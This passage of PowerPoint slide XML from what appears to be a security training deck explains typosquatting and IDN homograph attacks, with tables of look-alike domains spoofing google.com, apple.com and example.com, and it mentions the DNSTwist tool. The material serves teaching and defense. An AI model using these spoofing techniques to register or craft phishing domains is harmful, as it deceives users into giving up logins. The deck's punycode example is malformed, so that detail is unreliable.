          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>For example, the attacker registers go0gle.com (with the lowercase letter O replaced by the numeral 0) or goggle.com. A user who mistypes the URL is redirected to a malicious website designed to look exactly like Google’s login portal or install malware.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Common </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>typosquatting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> patterns include:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Table 4"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3496683570"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="0" y="2247900"/>
          <a:ext cx="11444748" cy="3401060"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="4886508">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1598521842"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="6558240">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1644222746"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l"/>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Technique</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l"/>
                      <a:r>
                        <a:rPr lang="en-US" b="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Example (Target google.com)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1021835824"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="404171">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="1" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Character omission</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="0" dirty="0">
                        <a:effectLst/>
                        <a:latin typeface="quote-cjk-patch"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>goole.com (missing one 'g')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2898900937"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="612140">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="1" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Character repetition</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="0" dirty="0">
                        <a:effectLst/>
                        <a:latin typeface="quote-cjk-patch"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>gooogle.com (extra 'o')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1911646501"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="404171">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="1" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Adjacent key swap (QWERTY)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="0" dirty="0">
                        <a:effectLst/>
                        <a:latin typeface="quote-cjk-patch"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>googlw.com (</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>mis</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>‑typed 'e')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3953426710"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="404171">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="1">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Number‑letter substitution</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="0">
                        <a:effectLst/>
                        <a:latin typeface="quote-cjk-patch"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>g00gle.com or the classic go0gle.com</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1296779756"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="404171">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="1">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Adding a subdomain prefix</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="0">
                        <a:effectLst/>
                        <a:latin typeface="quote-cjk-patch"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>secure-google-login.com (combo‑squatting)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1061092435"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="404171">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="1" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Adding a non‑standard TLD</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="0" dirty="0">
                        <a:effectLst/>
                        <a:latin typeface="quote-cjk-patch"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>google.org or </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>google.xyz</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="0" dirty="0">
                        <a:effectLst/>
                        <a:latin typeface="quote-cjk-patch"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3647143929"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12215590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431486" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>These look‑alike domains are often registered just hours after a new service launches. In fact, Google owns more than 14 look‑alike domains (such as gogle.com and googlr.com) that all redirect back to google.com—a defensive measure to pre‑empt </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>typosquatters</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>. For offensive security exercises, you can find such potential "typo" domains using tools like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>DNSTwist</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>, a Python script that scans for imitative domains that could be used for phishing or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>typosquatting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> attacks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>2. What is a Homograph Attack (IDN)?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>While </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>typosquatting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> relies on user typing mistakes, a homograph attack exploits what the user sees in the address bar. This attack uses visually identical characters from different alphabets to create a domain name that looks legitimate but points to a malicious server.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Key concept: The attack uses </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>homoglyphs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> – characters from different writing systems (e.g., the Cyrillic letter "а" looks exactly like the Latin "a"). Modern browsers support Internationalized Domain Names (IDN), which can display Unicode characters from dozens of scripts (Cyrillic, Greek, Armenian, etc.). An attacker registers the malicious domain using Unicode homoglyphs (e.g., xn-80ak6aa92e.com which visually renders as аррӏе.com indistinguishable from apple.com).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://www.ascii-code.com/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="29380586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342CF-F8F9-C702-153D-FACD3D2FADC6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="304800" y="500062"/>
            <a:ext cx="10515600" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Homoglyph examples:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:b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526126369"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="285750" y="1281111"/>
          <a:ext cx="11620500" cy="3751264"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="2905125">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="652582589"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2905125">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="133420250"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2905125">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="302591313"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2905125">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1583902680"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="937816">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l"/>
                      <a:r>
                        <a:rPr lang="en-US" sz="2300" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Target domain</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l"/>
                      <a:r>
                        <a:rPr lang="en-US" sz="2300" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Visually identical spoof</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l"/>
                      <a:r>
                        <a:rPr lang="en-US" sz="2300" b="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Character substitution</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l"/>
                      <a:r>
                        <a:rPr lang="en-US" sz="2300" b="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>What the user sees</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3790393093"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="937816">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="2300" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>google.com</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="2300" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>g</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="el-GR" sz="2300" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>οο</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2300" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>gle.com</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="2300" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Latin 'o' → Greek omicron '</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="el-GR" sz="2300" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>ο'</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="2300" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Looks exactly like google.com</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4239255764"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="937816">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="2300" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>apple.com</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="az-Cyrl-AZ" sz="2300" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>аррӏе.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2300" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>com</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="2300" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Latin 'a/p' → Cyrillic '</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="az-Cyrl-AZ" sz="2300" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>а/р/ӏ'</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="2300" b="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Looks exactly like apple.com</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2400358540"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="937816">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="2300" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>example.com</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="az-Cyrl-AZ" sz="2300" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>е</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2300" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>xample.com</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="2300" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Latin 'e' → Cyrillic '</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="az-Cyrl-AZ" sz="2300" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>е'</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="2300" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="quote-cjk-patch"/>
                        </a:rPr>
                        <a:t>Looks exactly like example.com</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3479848569"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
